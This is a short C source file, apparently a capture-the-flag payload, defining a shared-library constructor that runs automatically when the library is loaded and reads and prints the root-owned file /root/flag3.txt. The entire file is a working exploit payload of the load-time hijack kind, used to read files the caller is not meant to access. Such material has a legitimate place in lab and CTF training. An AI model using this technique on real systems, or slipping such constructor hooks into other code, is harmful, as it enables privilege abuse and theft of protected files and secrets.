#include <unistd.h>
#include <fcntl.h>

__attribute__((constructor)) void init() {
    int f = open("/root/flag3.txt", 0);
    char b[256];
    int n = read(f, b, 255);
    write(1, b, n);
}
